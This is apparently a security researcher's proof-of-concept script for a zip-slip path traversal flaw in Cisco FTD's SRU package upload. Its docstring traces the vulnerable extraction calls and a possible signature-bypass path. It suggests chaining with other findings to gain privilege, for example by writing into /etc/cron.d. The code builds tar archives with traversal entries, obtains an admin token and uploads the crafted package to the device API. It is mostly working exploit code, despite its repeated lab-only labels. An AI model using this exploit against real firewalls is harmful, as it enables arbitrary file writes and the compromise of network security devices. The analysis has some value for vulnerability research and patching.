"""
F-FTD-66: FDM SRU Upload Zip-Slip via NGFWFileUtils.extractTarArchive
CONTROLLED ENVIRONMENT ONLY

Root cause:
  NGFWFileUtils.extractTarArchive(File srcFile, String destDir, boolean isGzip, String filter)
  uses tarEntry.getName() directly in new File(destDir, tarEntry.getName()) with NO canonical
  path check — classic zip-slip pattern.

  Call chain (SRU upload path):
    POST /api/fdm/v6/action/updatesrufromfile (multipart, authenticated admin)
    → UploadDBUpdateFileResource.downloadFile()
      → NGFWFileUtils.extractFileName() (FilenameUtils.getName — path sanitized, safe)
      → UpgradeFileUtils.sanitizeFileName() (char whitelist check)
      → [file saved to ${sruUploadFile.temp.location}/verify/]
      → SignedFileUtils.validateSignedFile() via verify_signed_image.sh
         [SIGNATURE GATE — outer file must be Cisco-signed]
    → file moved to ${sruUploadFile.location}
    → SRUUpdateServices.update() → SRUUnpackerImpl.unpackSRUPackage()
      → traditionalUnpackSRUPackage()
        → SRUUnpackerImpl.extractSRUPackage(file):
            if (file.getName().contains("Sourcefire")) {
                // BYPASS: unsigned dev-mode path — skips outer tar extraction
                bundleFile = file;  // use file directly as bundle
            } else {
                // Signed path: extract outer tar looking for bundle.tar
                NGFWFileUtils.extractTarArchive(file, SRUWorkingDir, false, "bundle.tar");
                // ↑ ZIP-SLIP #1 in outer tar
                NGFWFileUtils.extractTarArchive(bundle.tar, SRUWorkingDir, false, ".*");
                // ↑ ZIP-SLIP #2 in inner bundle.tar
            }
        → untarSruSubpackage(bundleFile, checksums, sruData):
            NGFWFileUtils.extractTarArchive(bundleFile, SRUWorkingDir+"/files/", true, null);
            // ↑ ZIP-SLIP #3 — subpackage extraction (no sig check on individual .tar.gz files)

  NGFWFileUtils.extractTarArchive() vulnerable code (no canonical check):
    File outputFile = new File(destDir, tarEntry.getName());
    new FileOutputStream(outputFile.getAbsolutePath())
    // tarEntry.getName() can be "../../../../../../tmp/evil" → traverses destDir boundary

Signature bypass observation (NOT confirmed exploitable without lab):
  extractSRUPackage() contains a dev-mode path:
    if (filename.contains("Sourcefire")) → skip outer tar extraction
  This path uses the uploaded file directly as the bundle.
  If verify_signed_image.sh validation can be bypassed or doesn't apply to
  "Sourcefire"-named files reaching the SRU working dir via a different path,
  the zip-slip in untarSruSubpackage becomes reachable without a Cisco signing key.

Attack conditions:
  1. Admin credentials on FDM (F-FTD-60 or F-FTD-64 pre-auth takeover)
  2. Ability to craft inner tar subpackage entries with path traversal names
  3. Bypass or forge outer Cisco signature on the SRU wrapper
     OR use dev-mode "Sourcefire" filename path (requires further investigation)

Impact (if exploitable):
  Arbitrary file write as www user (Tomcat process)
  → Write to /etc/cron.d/ (if writable by www) or overwrite config files
  → Combined with Snort plugin injection (F-FTD-63): www → sfsnort pivot
  → Combined with CA key read (F-FTD-61): www → sfca group pivot

Affected: FTD 6.7.0-65. All versions sharing NGFWFileUtils.extractTarArchive.
Auth required: YES (admin credentials needed for API access).

Severity: HIGH (authenticated admin + Cisco signature required for full exploit chain).
  MEDIUM if dev-mode "Sourcefire" bypass is reachable without signing.

Evidence source: bytecode analysis of sru-importer.jar (SRUUnpackerImpl.class)
  and common.jar (NGFWFileUtils.class). Exploitation requires lab verification.
"""

# CONTROLLED ENVIRONMENT ONLY

import tarfile
import os
import sys
import io
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

FDM_API_BASE = "/api/fdm/v6"
TOKEN_PATH = f"{FDM_API_BASE}/fdm/token"
SRU_UPLOAD_PATH = f"{FDM_API_BASE}/action/updatesrufromfile"


def get_auth_token(host, username, password, port=443):
    """Obtain FDM OAuth token."""
    url = f"https://{host}:{port}{TOKEN_PATH}"
    body = {"grant_type": "password", "username": username, "password": password}
    r = requests.post(url, json=body, verify=False, timeout=15)
    if r.status_code == 200:
        token = r.json().get("access_token")
        print(f"[+] Authenticated as {username}")
        return token
    print(f"[-] Auth failed: {r.status_code} — {r.text[:100]}")
    return None


def create_zipslip_inner_tar(payload_path, payload_content, dest_name=None):
    """
    Create a malicious inner tar.gz with a zip-slip path traversal entry.

    The inner tar subpackages are NOT Cisco-signed — only the outer wrapper is.
    If the outer wrapper can be forged (requires Cisco key) or bypassed
    (Sourcefire dev path), this inner tar achieves file write outside destDir.

    Args:
        payload_path: target file to write (e.g., "/tmp/ftd66-zipslip-proof.txt")
        payload_content: bytes to write to target
        dest_name: tar entry name (default: auto-computed traversal to payload_path)

    CONTROLLED ENVIRONMENT ONLY — writes only to /tmp on controlled FTD lab device.
    """
    # SRUWorkingDir/files/ is the extraction destDir for untarSruSubpackage
    # Traversal from /sru/working/dir/files/ to payload_path
    # Example: for /tmp/ftd66.txt: ../../../../../../../../tmp/ftd66.txt
    if dest_name is None:
        depth = payload_path.count('/') + 2
        traversal = '../' * depth + payload_path.lstrip('/')
        dest_name = traversal

    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode='w:gz') as tar:
        info = tarfile.TarInfo(name=dest_name)
        info.size = len(payload_content)
        tar.addfile(info, io.BytesIO(payload_content))

    inner_tar_bytes = buf.getvalue()
    print(f"[*] Inner tar.gz created: {len(inner_tar_bytes)} bytes")
    print(f"    Entry name: {dest_name}")
    print(f"    Target path: {payload_path}")
    return inner_tar_bytes


def create_zipslip_outer_tar(inner_tar_bytes, outer_name="snort-2983-2983.0.tar.gz"):
    """
    Create the outer SRU tar containing the malicious inner tar.

    This outer tar would need to pass verify_signed_image.sh (Cisco RSA-2048 sig).
    Without Cisco's key this only demonstrates the structural attack.
    The 'bundle.tar' name is what extractSRUPackage looks for inside the outer tar.

    CONTROLLED ENVIRONMENT ONLY
    """
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode='w') as tar:
        info = tarfile.TarInfo(name="bundle.tar")
        info.size = len(inner_tar_bytes)
        tar.addfile(info, io.BytesIO(inner_tar_bytes))

    outer_bytes = buf.getvalue()
    print(f"[*] Outer tar (bundle.tar wrapper) created: {len(outer_bytes)} bytes")
    return outer_bytes


def demonstrate_zipslip_structure(output_dir="/tmp"):
    """
    Demonstrate the zip-slip tar structure without uploading to a live device.
    Writes .tar artifacts for manual inspection.
    CONTROLLED ENVIRONMENT ONLY
    """
    payload = b"F-FTD-66: zip-slip proof — NGFWFileUtils.extractTarArchive path traversal\n"
    target = "/tmp/ftd66-zipslip-proof.txt"

    print(f"\n[*] Creating zip-slip demonstration artifacts")
    print(f"    Target write path: {target}")

    inner_bytes = create_zipslip_inner_tar(target, payload)
    outer_bytes = create_zipslip_outer_tar(inner_bytes)

    inner_path = os.path.join(output_dir, "ftd66_inner_zipslip.tar.gz")
    outer_path = os.path.join(output_dir, "ftd66_outer_sru.tar")

    with open(inner_path, 'wb') as f:
        f.write(inner_bytes)
    with open(outer_path, 'wb') as f:
        f.write(outer_bytes)

    print(f"\n[+] Artifacts written:")
    print(f"    Inner tar (malicious subpackage): {inner_path}")
    print(f"    Outer tar (SRU wrapper):          {outer_path}")
    print(f"\n[*] To test zip-slip in isolation (on controlled FTD host):")
    print(f"    python3 -c \"")
    print(f"    import tarfile, os")
    print(f"    destDir = '/tmp/ftd66-test-extract/'")
    print(f"    os.makedirs(destDir, exist_ok=True)")
    print(f"    with tarfile.open('{inner_path}') as tar:")
    print(f"        for entry in tar.getmembers():")
    print(f"            out = os.path.join(destDir, entry.name)")
    print(f"            # ← Java does: new File(destDir, tarEntry.getName())")
    print(f"            # ← NO canonical check — traversal succeeds")
    print(f"            print('Would write to:', os.path.normpath(out))")
    print(f"    \"")

    return inner_path, outer_path


def upload_sru_payload(host, token, tar_path, port=443):
    """
    Upload crafted SRU tar to POST /action/updatesrufromfile.
    Requires: admin token AND a Cisco-signed outer wrapper to pass sig check.
    This function demonstrates the upload mechanism; the outer tar must be
    legitimately signed to pass verify_signed_image.sh validation.
    CONTROLLED ENVIRONMENT ONLY
    """
    url = f"https://{host}:{port}{SRU_UPLOAD_PATH}"
    headers = {"Authorization": f"Bearer {token}"}

    print(f"\n[*] Uploading SRU package to {url}")
    print(f"    File: {tar_path}")
    print(f"    NOTE: verify_signed_image.sh will run before extraction")

    with open(tar_path, 'rb') as f:
        files = {"fileToUpload": (os.path.basename(tar_path), f, "application/x-tar")}
        try:
            r = requests.post(url, headers=headers, files=files, verify=False, timeout=120)
            print(f"[*] Response: {r.status_code}")
            print(f"    Body: {r.text[:400]}")
            return r.status_code in (200, 201, 202)
        except Exception as e:
            print(f"[-] Upload error: {e}")
            return False


if __name__ == '__main__':
    print("=" * 70)
    print("F-FTD-66: FDM SRU Upload Zip-Slip (NGFWFileUtils.extractTarArchive)")
    print("CONTROLLED ENVIRONMENT ONLY")
    print("=" * 70)
    print(f"""
Vulnerable method: NGFWFileUtils.extractTarArchive(File, String destDir, bool, String)
  new File(destDir, tarEntry.getName())  <- NO canonical path check
  Called from: SRUUnpackerImpl.extractSRUPackage() + untarSruSubpackage()
  Upload endpoint: POST /api/fdm/v6/action/updatesrufromfile (authenticated)

Sig bypass note:
  extractSRUPackage(): filename.contains("Sourcefire") → skips outer tar extraction
  Inner subpackage tars NOT individually signed
  Full exploit requires forged Cisco sig OR dev-mode bypass (lab investigation required)
""")

    mode = sys.argv[1] if len(sys.argv) > 1 else 'demo'

    if mode == 'demo':
        print("--- Mode: demonstrate zip-slip tar structure ---")
        demonstrate_zipslip_structure()

    elif mode == 'upload':
        if len(sys.argv) < 5:
            print(f"Usage: {sys.argv[0]} upload <host> <admin> <password> [tar_file]")
            sys.exit(1)
        host = sys.argv[2]
        username = sys.argv[3]
        password = sys.argv[4]
        tar_file = sys.argv[5] if len(sys.argv) > 5 else None

        token = get_auth_token(host, username, password)
        if not token:
            sys.exit(1)

        if tar_file is None:
            print("[*] No tar file specified — creating demonstration payload")
            _, tar_file = demonstrate_zipslip_structure()

        upload_sru_payload(host, token, tar_file)

    elif mode == 'static':
        print("--- Static analysis summary ---")
        print(f"""
Zip-slip vulnerable calls in SRU path:
  #1: SRUUnpackerImpl.extractSRUPackage() line ~88
      NGFWFileUtils.extractTarArchive(file, SRUWorkingDir, false, "bundle.tar")
      destDir: /ngfw/var/cisco/sru/working/
      filter: "bundle.tar" (only files matching "bundle.tar" are extracted)
      traversal: bundle.tar entry named "../../../../../../etc/cron.d/evil"

  #2: SRUUnpackerImpl.extractSRUPackage() line ~151
      NGFWFileUtils.extractTarArchive(bundle.tar, SRUWorkingDir, false, ".*")
      destDir: /ngfw/var/cisco/sru/working/
      filter: ".*" (all files)
      traversal: any entry in bundle.tar with ".." in path

  #3: SRUUnpackerImpl.untarSruSubpackage() (most severe)
      NGFWFileUtils.extractTarArchive(bundleFile, SRUWorkingDir+"/files/<name>", true, null)
      destDir: /ngfw/var/cisco/sru/working/files/<pkg-name>/
      filter: null (no filter — all entries extracted)
      traversal: any .tar.gz entry in bundle with ".." path

Upstream gate: SignedFileUtils.validateSignedFile() → verify_signed_image.sh (RSA-2048)
  Blocks unsigned outer wrappers — inner subpackage tars are not re-validated.
  Lab investigation needed: can the Sourcefire dev-mode path bypass outer sig check?

Related findings:
  F-FTD-60: Admin credentials → exploit chain entry
  F-FTD-63: Snort plugin injection (www → sfsnort via detection group write)
  F-FTD-65: Neo4j AES key extraction
""")

    print("\n[*] CONTROLLED ENVIRONMENT ONLY.")
